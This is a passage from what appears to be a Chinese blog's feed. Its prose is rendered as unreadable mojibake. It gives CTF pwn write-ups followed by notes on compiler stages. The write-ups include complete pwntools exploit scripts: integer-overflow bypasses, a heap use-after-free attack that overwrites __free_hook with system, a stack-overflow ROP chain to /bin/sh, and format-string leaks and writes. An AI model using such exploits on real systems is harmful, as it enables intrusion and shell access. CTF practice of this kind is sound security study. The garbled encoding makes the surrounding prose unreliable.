        <content type="html"><![CDATA[<h3 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h3><p>è¿™é¢˜è¿˜æ˜¯æœ‰ç‚¹æ„æ€çš„ï¼Œè€ƒç‚¹åœ¨äºè¡¥ç ä¸unsigned intã€‚</p><p>é¦–å…ˆè§‚å¯Ÿbypass1ï¼Œç¬¬ä¸€ä¸ªifåˆ¤æ–­æ˜¯ä¸å…è®¸å‡ºç°â€œ - â€å·ï¼Œ ç¬¬äºŒä¸ªifåˆ¤æ–­æ˜¯x &lt;= 359 , y &lt;=  359 , x-y = 360</p><p>é‚£ä¹ˆè‡ªç„¶è€ƒè™‘ï¼æ•°ã€‚</p><!-- åŸç æ˜¯æœ€ç›´è§‚çš„è¡¨ç¤ºæ–¹å¼ï¼šæœ€é«˜ä½è¡¨ç¤ºç¬¦å·(0è¡¨ç¤ºæ­£ï¼Œ1è¡¨ç¤ºè´Ÿ) --><!--è¡¥ç çš„è¡¨ç¤ºæ–¹æ³•æ˜¯:--><!--æ­£æ•°çš„è¡¥ç å°±æ˜¯å…¶æœ¬èº«--><!--è´Ÿæ•°çš„è¡¥ç æ˜¯åœ¨å…¶åŸç çš„åŸºç¡€ä¸Š, ç¬¦å·ä½ä¸å˜, å…¶ä½™å„ä½å–å, æœ€å+1. (å³åœ¨åç çš„åŸºç¡€ä¸Š+1)--><!--[+1] = [00000001]åŸ = [00000001]å = [00000001]è¡¥--><!--[-1] = [10000001]åŸ = [11111110]å = [11111111]è¡¥--><p>è€Œæˆ‘ä»¬å¯ä»¥æ ¹æ®idaè§‚å¯Ÿåˆ°ï¼Œæ­¤æ¬¡çš„ä¸¤ä¸ªbypasséƒ½æ˜¯unsigned intï¼Œè€Œ unsigned intçš„ç‰¹ç‚¹æ˜¯ï¼šæœ€é«˜ä½ä¸ä½œä¸ºç¬¦å·ä½ï¼Œæ‰€æœ‰ä½éƒ½è¡¨ç¤ºå€¼ã€‚</p><h4 id="bypass1"><a href="#bypass1" class="headerlink" title="bypass1"></a>bypass1</h4><p>æ•…æ­¤ï¼Œ0xFFFF FFFF   ( 1111 1111 1111 1111 1111 1111 1111 1111)å°±è¡¨ç¤º-1</p><p>æ‰€ä»¥bypass1 å¯ä»¥é€šè¿‡x = 359 , y = 4294967295 ç»•è¿‡</p><h4 id="bypass2"><a href="#bypass2" class="headerlink" title="bypass2"></a>bypass2</h4><p>ç¬¬äºŒä¸ªæ˜¯ä¹˜æ³•ï¼Œä¸”æ¡ä»¶ä¸ºx &gt; 1 &amp;&amp; y &gt; 360 &amp;&amp; x * y =360</p><p>è¿™æ¬¡åˆ©ç”¨æ•´æ•°æº¢å‡º</p><p>4294967295 + 361 = 4294967656 ï¼ˆ0001 0000 0000 0000 0000 0000 0001 0110 1000ï¼‰</p><p>æ¯«æ— ç–‘é—®è¶…è¿‡äº†32ä½ï¼Œunsigned int å–å‰32ä½ï¼Œè‡ªç„¶å°±æ˜¯0000 0000 0000 0000 0000 0001 0110 1000</p><p>æ‰€ä»¥ åªè¦x * y = 4294967656å°±å¯ä»¥é€šè¿‡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¬¬äº”ç©ºé—´çº¿ä¸‹èµ›ï¼ˆpwnï¼‰</title>
      <link href="/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/"/>
      <url>/2019/10/18/%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E7%BA%BF%E4%B8%8B%E8%B5%9B%EF%BC%88pwn%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="ä¸€"><a href="#ä¸€" class="headerlink" title="ä¸€"></a>ä¸€</h3><p>é¦–å…ˆidaæŸ¥çœ‹ï¼Œæ˜¯ä¸€ä¸ªæ ‡å‡†çš„å †é¢˜</p><p>æŸ¥çœ‹deleteï¼Œuafæ¼æ´</p><p>é‚£ä¹ˆè‡ªç„¶æ˜¯fasted bin attack + unsortd bin çš„ç»„åˆæ”»å‡»</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(content))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span><span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">sh.recvuntil(<span class="string">'&gt;&gt;'</span>)</span><br><span class="line">sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment">########################################unsorted bin attack#####################################</span></span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">main_arena = u64(sh.recvuntil(<span class="string">'\n'</span>)[<span class="number">-7</span>:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">log.success(<span class="string">'main_arena='</span>+hex(main_arena))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">__malloc_hook = main_arena - <span class="number">0x10</span></span><br><span class="line">libc_addr = __malloc_hook - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">system = libc_addr + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">binsh = libc_addr + libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line"></span><br><span class="line">__free_hook = libc_addr + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">log.success(<span class="string">'__free_hook='</span>+hex(__free_hook))</span><br><span class="line"><span class="comment">#gdb.attach(sh)</span></span><br><span class="line">payload = p64(main_arena) + p64(__free_hook - <span class="number">0x40</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment">###################################fasted bin attack ###########################################</span></span><br><span class="line">fastbin_attack = __free_hook - (<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(fastbin_attack))</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'\x00'</span>*<span class="number">3</span>+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(system))</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="ä¸‰"><a href="#ä¸‰" class="headerlink" title="ä¸‰"></a>ä¸‰</h3><p>æ¼æ´ç‚¹åœ¨</p><p>è‹¥è¾“å…¥è´Ÿæ•°ï¼Œåˆ™readçš„sizeä½ä¾¿æå¤§ï¼Œä½¿å¾—å…è®¸æ ˆæº¢å‡º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">bss = <span class="number">0x0804A040</span></span><br><span class="line">main_addr = <span class="number">0x08048668</span></span><br><span class="line">system_addr = <span class="number">0x0804865D</span></span><br><span class="line">pop3_ret = <span class="number">0x08048779</span></span><br><span class="line">sh = process(<span class="string">'./pwn'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="comment">#######################write bss######################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line"><span class="comment">#payload += p32(0x0804864F)</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'read'</span>]) + p32(pop3_ret) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">8</span>) +p32(main_addr)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#########################get shell####################</span></span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'20'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">':'</span>)</span><br><span class="line">sh.sendline(<span class="string">'-1'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x5c</span>+<span class="number">0x4</span>)</span><br><span class="line">payload += p32(system_addr)+p32(<span class="number">0x0</span>)+p32(bss)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="äº”"><a href="#äº”" class="headerlink" title="äº”"></a>äº”</h3><p>æ¼æ´ç‚¹åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œé‚£ä¹ˆå°±æœ‰ä¸¤ç§è§£é¢˜çš„åŠæ³•</p><h4 id="ç¬¬ä¸€ç§ï¼š50-æ¦‚ç‡çš„"><a href="#ç¬¬ä¸€ç§ï¼š50-æ¦‚ç‡çš„" class="headerlink" title="ç¬¬ä¸€ç§ï¼š50%æ¦‚ç‡çš„"></a>ç¬¬ä¸€ç§ï¼š50%æ¦‚ç‡çš„</h4><p>ä¸ºä»€ä¹ˆåªæœ‰50%å‘¢ï¼Œå› ä¸ºä¼šéšæœºå‡ºè´Ÿæ•°é¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = process("./pwn")</span></span><br><span class="line">sh = remote(<span class="string">"node2.buuoj.cn.wetolink.com"</span>, <span class="number">28695</span>)</span><br><span class="line"></span><br><span class="line">suiji_addr = <span class="number">0x0804C044</span></span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.send(p32(suiji_addr) + <span class="string">"%10$s"</span>)</span><br><span class="line"><span class="comment">#sh.recvuntil(".")</span></span><br><span class="line">sh.recvuntil(<span class="string">'\x08'</span>)</span><br><span class="line">suiji = u32(sh.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> suiji</span><br><span class="line"><span class="keyword">print</span> hex(suiji)</span><br><span class="line"><span class="keyword">print</span> int(suiji)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"passwd"</span>)</span><br><span class="line">sh.sendline(str(suiji))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h4 id="ç¬¬äºŒç§ï¼š100-æ¦‚ç‡çš„"><a href="#ç¬¬äºŒç§ï¼š100-æ¦‚ç‡çš„" class="headerlink" title="ç¬¬äºŒç§ï¼š100%æ¦‚ç‡çš„"></a>ç¬¬äºŒç§ï¼š100%æ¦‚ç‡çš„</h4><p>è¿™å°±æ˜¯åå‘å†™å…¥äº†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">sh = process(<span class="string">"./pwn"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    sh.sendafter(<span class="string">"your name:"</span>,payload)</span><br><span class="line">target=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(target)+<span class="string">"%10$n"</span></span><br><span class="line">fsb(payload)</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">"your passwd:"</span>,<span class="string">"4"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»ï¼ˆæ•´ç†ï¼‰</title>
      <link href="/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/"/>
      <url>/2019/10/18/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB%EF%BC%88%E6%95%B4%E7%90%86%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="ç¼–è¯‘ä¸é“¾æ¥"><a href="#ç¼–è¯‘ä¸é“¾æ¥" class="headerlink" title="ç¼–è¯‘ä¸é“¾æ¥"></a>ç¼–è¯‘ä¸é“¾æ¥</h3><p>åœ¨linuxä¸‹ï¼Œä½¿ç”¨gccç¼–è¯‘ç¨‹åºçš„æ—¶å€™ï¼Œéœ€è¦ç»å†å››æ­¥è¿‡ç¨‹ï¼Œåˆ†åˆ«æ˜¯é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–å’Œé“¾æ¥</p><h4 id="ç¼–è¯‘å™¨æµç¨‹"><a href="#ç¼–è¯‘å™¨æµç¨‹" class="headerlink" title="ç¼–è¯‘å™¨æµç¨‹"></a>ç¼–è¯‘å™¨æµç¨‹</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Source Code] --&gt;|Scanner| B(Tokens)</span><br><span class="line">B --&gt; |Parser| C(Syntax Tree)</span><br><span class="line">C --&gt; |Semantic Analyzer| D(Commented Syntax Tree)</span><br><span class="line">D --&gt; |Source Code Optimizer| E(Intermediate Representation)</span><br><span class="line">E --&gt; |Code Generator| F(Target Code)</span><br><span class="line">F --&gt; |Code Optimizer| G(Final Target Code)</span><br></pre></td></tr></table></figure><h4 id="é¢„å¤„ç†"><a href="#é¢„å¤„ç†" class="headerlink" title="é¢„å¤„ç†"></a>é¢„å¤„ç†</h4><p>é¢„å¤„ç†è¿‡ç¨‹ä¸»è¦å¤„ç†æºä»£ç ä¸­ä»¥â€œ#â€å¼€å§‹çš„é¢„ç¼–è¯‘æŒ‡ä»¤ã€‚æ¯”å¦‚â€œ#includeâ€ï¼Œâ€œ#defineâ€ç­‰ï¼Œä¸»è¦å¤„ç†è§„åˆ™å¦‚ä¸‹ï¼š</p><ol><li>å°†æ‰€æœ‰çš„â€œ#defineâ€åˆ é™¤ï¼Œå¹¶ä¸”å±•å¼€æ‰€æœ‰çš„å®å®šä¹‰ã€‚</li><li>å¤„ç†æ‰€æœ‰æ¡ä»¶é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œæ¯”å¦‚ï¼šâ€œ#ifâ€ï¼Œâ€œ#ifdefâ€ï¼Œâ€œ#elifâ€ï¼Œâ€œ#elseâ€ï¼Œâ€#endifâ€ã€‚</li><li>å¤„ç†â€œ#includeâ€é¢„ç¼–è¯‘æŒ‡ä»¤ï¼Œå°†è¢«åŒ…å«çš„æ–‡ä»¶æ’å…¥åˆ°è¯¥é¢„ç¼–è¯‘æŒ‡ä»¤çš„ä½ç½®ï¼Œæ³¨æ„ï¼Œè¿™ä¸ªè¿‡ç¨‹æ˜¯é€’å½’è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´è¢«åŒ…å«çš„æ–‡ä»¶å¯èƒ½è¿˜åŒ…å«å…¶ä»–æ–‡ä»¶ã€‚</li><li>åˆ é™¤æ‰€æœ‰çš„æ³¨é‡Šâ€œ\\â€œå’Œâ€/**/â€œã€‚</li><li>æ·»åŠ è¡Œå·å’Œæ–‡ä»¶æ ‡è¯†åï¼Œæ¯”å¦‚#2â€hello.câ€œ 2ï¼Œä»¥ä¾¿äºç¼–è¯‘æ—¶ç¼–è¯‘å™¨äº§ç”Ÿè°ƒè¯•ç”¨çš„è¡Œå·ä¿¡æ¯ä»¥åŠç”¨äºç¼–è¯‘æ—¶äº§ç”Ÿç¼–è¯‘é”™è¯¯æˆ–è­¦å‘Šæ—¶èƒ½å¤Ÿæ˜¾ç¤ºè¡Œå·.</li><li>ä¿ç•™æ‰€æœ‰çš„#prcagmaç¼–è¯‘å™¨æŒ‡ä»¤ï¼Œå› ä¸ºç¼–è¯‘å™¨éœ€è¦ä½¿ç”¨å®ƒä»¬ã€‚</li></ol><p>ç»è¿‡é¢„å¤„ç†çš„.iæ–‡ä»¶ä¸åŒ…å«ä»»ä½•å®å®šä¹‰ï¼Œå› ä¸ºæ‰€æœ‰çš„å®å·²ç»è¢«å±•å¼€ã€‚</p><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><p>ç¼–è¯‘è¿‡ç¨‹å°±æ˜¯æŠŠé¢„å¤„ç†å®Œçš„æ–‡ä»¶è¿›è¡Œä¸€ç³»åˆ—è¯æ³•åˆ†æï¼Œè¯­æ³•åˆ†æï¼Œè¯­ä¹‰åˆ†æä»¥åŠä¼˜åŒ–åç”Ÿäº§ç›¸åº”çš„æ±‡ç¼–ä»£ç ã€‚</p><p>ä¸¾ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[index] = (index + <span class="number">4</span>) * (<span class="number">2</span>+<span class="number">6</span>)</span><br><span class="line">CompilerExpression.c</span><br></pre></td></tr></table></figure><h4 id="è¯æ³•åˆ†æ"><a href="#è¯æ³•åˆ†æ" class="headerlink" title="è¯æ³•åˆ†æ"></a>è¯æ³•åˆ†æ</h4><p>æºä»£ç ç¨‹åºè¢«è¾“å…¥åˆ°æ‰«æå™¨ï¼Œè¿ç”¨ç±»ä¼¼äºæœ‰é™çŠ¶æ€æœºçš„ç®—æ³•å°†æºä»£ç çš„å­—ç¬¦åºåˆ—åˆ†å‰²æˆä¸€ç³»åˆ—çš„è®°å·ï¼ˆtokenï¼‰ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è®°å·(token)åˆ†ä¸ºå¦‚ä¸‹å‡ ç±»ï¼šå…³é”®å­—ï¼Œæ ‡è¯†ç¬¦ï¼Œå­—é¢é‡ï¼ˆåŒ…å«æ•°å­—ï¼Œå­—ç¬¦ä¸²ç­‰ï¼‰å’Œç‰¹æ®Šç¬¦å·ï¼ˆå¦‚åŠ å·ï¼Œç­‰å·ï¼‰</span><br></pre></td></tr></table></figure><p>è¯†åˆ«è®°å·çš„åŒæ—¶ï¼Œæ‰«æå™¨ä¹Ÿå®Œæˆäº†å…¶ä»–å·¥ä½œï¼Œä¾‹å¦‚å°†æ ‡è¯†ç¬¦å­˜æ”¾åˆ°ç¬¦å·è¡¨ï¼Œå°†æ•°å­—ï¼Œå­—ç¬¦ä¸²å¸¸é‡å­˜åˆ°æ–‡å­—è¡¨ç­‰ã€‚</p><p>leaç¨‹åºå®ç°è¯æ³•æ‰«æï¼ŒæŒ‰ç…§ç”¨æˆ·ä¹‹å‰æè¿°å¥½çš„è¯æ³•è§„åˆ™ï¼Œå°†è¾“å…¥çš„å­—ç¬¦ä¸²åˆ†å‰²æˆä¸€ä¸ªä¸ªè®°å·ã€‚</p><h4 id="è¯­æ³•åˆ†æ"><a href="#è¯­æ³•åˆ†æ" class="headerlink" title="è¯­æ³•åˆ†æ"></a>è¯­æ³•åˆ†æ</h4><p>è¯­æ³•åˆ†æå™¨å¯¹ç”±æ‰«æå™¨äº§ç”Ÿçš„è®°å·è¿›è¡Œè¯­æ³•åˆ†æï¼Œä»è€Œäº§ç”Ÿè¯­æ³•æ ‘ï¼ˆä»¥è¡¨è¾¾å¼ä¸ºèŠ‚ç‚¹çš„æ ‘ï¼‰ã€‚æ•´ä¸ªè¿‡ç¨‹é‡‡ç”¨äº†ä¸Šä¸‹æ–‡æ— å…³è¯­æ³•ã€‚</p><p>åœ¨è¯­æ³•åˆ†æçš„åŒæ—¶ï¼Œè¿ç®—ç¬¦å·çš„ä¼˜å…ˆçº§å’Œå«ä¹‰ä¹Ÿè¢«ç¡®å®šã€‚</p><p>å¦‚æœå‡ºç°äº†è¡¨è¾¾å¼ä¸åˆæ³•ï¼Œæ¯”å¦‚å„ç§æ‹¬å·ä¸åŒ¹é…ï¼Œè¡¨è¾¾å¼ä¸­ç¼ºå°‘æ“ä½œç¬¦ç­‰ï¼Œç¼–è¯‘å™¨å°±ä¼šæŠ¥å‘Šè¯­æ³•åˆ†æé˜¶æ®µçš„é”™è¯¯ã€‚ï¼ˆè¯­æ³•åˆ†æï¼Œä¹Ÿå°±æ˜¯æ£€æµ‹è¡¨è¾¾å¼æ ¼å¼æ­£ç¡®ä¸å¦ï¼‰</p><p>yaccå·¥å…·æ ¹æ®ç»™å®šçš„è¯­æ³•è§„åˆ™ï¼Œç”Ÿæˆè¯­æ³•æ ‘ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">graph TD</span><br><span class="line">A[Assign Expression =] --&gt;B(Subscript Expression )</span><br><span class="line">A[Assign Expression =] --&gt;C(Multiplicativer Expression *)</span><br><span class="line">B(Subscript Expression ) --&gt; D(Identifier array)</span><br><span class="line">B(Subscript Expression ) --&gt; F(Identifier Index)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; G(Addtive Expression +)</span><br><span class="line">C(Multiplicativer Expression *) --&gt; H(Addtive Expression +)</span><br><span class="line">G(Addtive Expression +) --&gt; I(Identifier Index)</span><br><span class="line">G(Addtive Expression +) --&gt; J(Number 4)</span><br><span class="line">H(Addtive Expression +) --&gt; K(Number 2)</span><br><span class="line">H(Addtive Expression +) --&gt; L(Number 6)</span><br></pre></td></tr></table></figure><h4 id="è¯­ä¹‰åˆ†æ"><a href="#è¯­ä¹‰åˆ†æ" class="headerlink" title="è¯­ä¹‰åˆ†æ"></a>è¯­ä¹‰åˆ†æ</h4><p>æ£€æµ‹è¿™ä¸ªè¡¨è¾¾å¼æ˜¯å¦çœŸçš„æœ‰æ„ä¹‰ã€‚ä¾‹å¦‚ä¸¤ä¸ªæŒ‡é’ˆåšä¹˜æ³•è¿ç®—æ˜¯æ²¡æœ‰æ„ä¹‰çš„ï¼Œä½†æ˜¯åœ¨è¯­æ³•åˆ†æé‡Œï¼Œè¯­æ³•ä¸Šæ˜¯åˆæ³•çš„ã€‚</p><p>ç¼–è¯‘å™¨æ‰€èƒ½åˆ†æçš„è¯­ä¹‰æ˜¯é™æ€è¯­ä¹‰ï¼ˆstaticSemanticï¼‰ï¼Œæ‰€è°“é™æ€è¯­ä¹‰æ˜¯æŒ‡åœ¨ç¼–è¯‘æœŸå¯ä»¥ç¡®å®šçš„è¯­ä¹‰ã€‚åŒ…æ‹¬å£°æ˜å’Œç±»å‹çš„åŒ¹é…ï¼Œç±»å‹çš„è½¬æ¢ã€‚</p><p>ä¸ä¹‹å¯¹åº”çš„æ˜¯åŠ¨æ€è¯­ä¹‰ï¼Œåªæœ‰åœ¨è¿è¡ŒæœŸæ‰èƒ½ç¡®å®šã€‚</p><h3 id="æ±‡ç¼–"><a href="#æ±‡ç¼–" class="headerlink" title="æ±‡ç¼–"></a>æ±‡ç¼–</h3><p>æ±‡ç¼–å™¨å°†æ±‡ç¼–ä»£ç è½¬ä¸ºæœºå™¨ç çš„è¿‡ç¨‹</p><h3 id="é“¾æ¥"><a href="#é“¾æ¥" class="headerlink" title="é“¾æ¥"></a>é“¾æ¥</h3><p>èœé¸¡å†™ä¸å‡ºæ¥ï¼Œå‘œå‘œï¼Œè¿˜æ˜¯ç­‰è¯¦ç»†çœ‹å®Œå†å†™å§</p><p><img 